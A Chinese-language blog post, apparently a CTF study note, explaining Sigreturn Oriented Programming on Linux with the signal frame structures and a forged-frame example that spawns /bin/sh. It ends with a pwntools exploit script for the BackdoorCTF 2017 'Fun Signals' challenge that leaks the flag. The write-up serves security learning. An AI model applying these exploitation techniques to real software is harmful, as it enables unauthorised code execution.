@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>SROP - Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
+signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
+一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="SROP" />
+<meta property="og:description" content="SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
+signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
+一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-22T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SROP"/>
+<meta name="twitter:description" content="SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
+signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
+一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context."/>
+
+	
+        <link href="https://example.com/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://example.com/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://example.com/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css" media="(prefers-color-scheme: dark)"  />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://example.com">Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/categories">Categories</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/about">About</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">SROP</h1>
+			<div class="meta">Posted on Jun 22, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="srop">SROP</h2>
+<p>srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制</p>
+<h3 id="signal-机制">signal 机制</h3>
+<p><img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224226.png" alt="image.png">
+如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。</p>
+<ul>
+<li>一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。</li>
+<li>一个新的返回地址被添加到栈顶，这个返回地址指向 <code>sigreturn</code> 系统调用。</li>
+<li>signal handler 被调用，signal handler 的行为取决于收到什么 signal。</li>
+<li>signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 <code>sigreturn</code> 系统调用。</li>
+<li><code>sigreturn</code> 利用 signal frame 恢复所有寄存器以回到之前的状态。</li>
+<li>最后，程序执行继续。
+64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// defined in /usr/include/sys/ucontext.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/* Userlevel context.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">ucontext_t</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> uc_flags;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">ucontext_t</span> <span style="color:#f92672">*</span>uc_link;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">stack_t</span> uc_stack;           <span style="color:#75715e">// the stack used by this context
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">mcontext_t</span> uc_mcontext;     <span style="color:#75715e">// the saved context
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">sigset_t</span> uc_sigmask;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _libc_fpstate __fpregs_mem;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">ucontext_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// defined in /usr/include/bits/types/stack_t.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/* Structure describing a signal stack.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ss_sp;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> ss_size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ss_flags;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">stack_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// difined in /usr/include/bits/sigcontext.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> sigcontext
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  __uint64_t r8;
+</span></span><span style="display:flex;"><span>  __uint64_t r9;
+</span></span><span style="display:flex;"><span>  __uint64_t r10;
+</span></span><span style="display:flex;"><span>  __uint64_t r11;
+</span></span><span style="display:flex;"><span>  __uint64_t r12;
+</span></span><span style="display:flex;"><span>  __uint64_t r13;
+</span></span><span style="display:flex;"><span>  __uint64_t r14;
+</span></span><span style="display:flex;"><span>  __uint64_t r15;
+</span></span><span style="display:flex;"><span>  __uint64_t rdi;
+</span></span><span style="display:flex;"><span>  __uint64_t rsi;
+</span></span><span style="display:flex;"><span>  __uint64_t rbp;
+</span></span><span style="display:flex;"><span>  __uint64_t rbx;
+</span></span><span style="display:flex;"><span>  __uint64_t rdx;
+</span></span><span style="display:flex;"><span>  __uint64_t rax;
+</span></span><span style="display:flex;"><span>  __uint64_t rcx;
+</span></span><span style="display:flex;"><span>  __uint64_t rsp;
+</span></span><span style="display:flex;"><span>  __uint64_t rip;
+</span></span><span style="display:flex;"><span>  __uint64_t eflags;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> cs;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> gs;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> fs;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> __pad0;
+</span></span><span style="display:flex;"><span>  __uint64_t err;
+</span></span><span style="display:flex;"><span>  __uint64_t trapno;
+</span></span><span style="display:flex;"><span>  __uint64_t oldmask;
+</span></span><span style="display:flex;"><span>  __uint64_t cr2;
+</span></span><span style="display:flex;"><span>  __extension__ <span style="color:#66d9ef">union</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> _fpstate <span style="color:#f92672">*</span> fpstate;
+</span></span><span style="display:flex;"><span>      __uint64_t __fpstate_word;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  __uint64_t __reserved1 [<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>在栈中的分布如下
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224245.png" alt=""></p>
+<h3 id="srop-利用原理">SROP 利用原理</h3>
+<p>在执行 <code>sigreturn</code> 系统调用的时候，不会对 signal 做检查，它不知道当前的这个 frame 是不是之前保存的那个 frame。由于 <code>sigreturn</code> 会从用户栈上恢复恢复所有寄存器的值，而用户栈是保存在用户进程的地址空间中的，是用户进程可读写的。如果攻击者可以控制了栈，也就控制了所有寄存器的值，而这一切只需要一个 gadget：<code>syscall; ret;</code>。
+通过设置 <code>eax/rax</code> 寄存器，可以利用 <code>syscall</code> 指令执行任意的系统调用，然后我们可以将 <code>sigreturn</code> 和其他的系统调用串起来，形成一个链，从而达到任意代码执行的目的。下面是一个伪造 frame 的例子：
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224317.png" alt="image.png"></p>
+<p><code>rax=59</code> 是 <code>execve</code> 的系统调用号，参数 <code>rdi</code> 设置为字符串“/bin/sh”的地址，<code>rip</code> 指向系统调用 <code>syscall</code>，最后，将 <code>rt_sigreturn</code> 设置为 <code>sigreturn</code> 系统调用的地址。当 <code>sigreturn</code> 返回后，就会从这个伪造的 frame 中恢复寄存器，从而拿到 shell。
+对于这个寄存器的选择，因为系统调用号必须存入 rax 中，其他的寄存器选择就需要按照 Linux 下的函数调用约定来进行。</p>
+<h2 id="pwnlib-rop-srop">pwnlib. rop. srop</h2>
+<p>在 pwntools 中已经集成了 SROP 的利用工具，即 <a href="http://docs.pwntools.com/en/stable/rop/srop.html">pwnlib.rop.srop</a>，直接使用类 <code>SigreturnFrame</code>，我们可以看到针对不同的架构 <code>SigreturnFrame</code> 构造了不同的 uncontext_t
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224340.png" alt="image.png"></p>
+<h2 id="backdoorctf-2017-fun-signals">BackdoorCTF 2017 Fun Signals</h2>
+<p>查看文件，可以看到这是一个 64 位的程序，并且没有开任何防护措施
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224404.png" alt="image.png">
+拖入 IDA 中查看，可以看到程序中进行了两次 syscall，第一次 rax 的值是 0，调用 read 函数，第二次 rax 值是 15，执行停止程序。同时我们也可以看到 flag 的位置，那么我们需要利用 SROP 将该位置的 flag 输出。
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224437.png" alt="image.png"></p>
+<h3 id="如何利用">如何利用</h3>
+<p>再看这两个 syscall：</p>
+<ul>
+<li>第一个 syscall 是 read 函数，此时的 edi 是 0，edx 是 0 x 400，rsi 是栈顶的值，根据 read 函数的参数和 Linux 函数调用约定可以知道，这意思是从标准输入读取0x400个字节到栈顶。</li>
+<li>第二个 syscall 是 sigreturn，它会将栈中的数据按照 ucontext_t 结构恢复寄存器。
+所以我们可以写入一个伪造的 sigreturn frame，让 sigreturn 恢复。
+为了能够输出 flag，那我们伪造的 sigreturn frame 得是一个 write 函数的系统调用，系统调用号是0x1</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./funsignals_player_bin&#39;</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./funsignals_player_bin&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = remote(&#39;hack.bckdr.in&#39;, 9034)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>clear()
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creating a custom frame</span>
+</span></span><span style="display:flex;"><span>frame <span style="color:#f92672">=</span> SigreturnFrame()
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_write
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>STDOUT_FILENO
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;flag&#39;</span>]
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;syscall&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(bytes(frame))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>成功将 flag 输出。
+<img src="https://gitee.com/juhuahua/chart-bed/raw/master/20230504224423.png" alt="image.png"></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9">PWN知识点</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2023  © Athul |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+</div>
+    </body>
+</html>
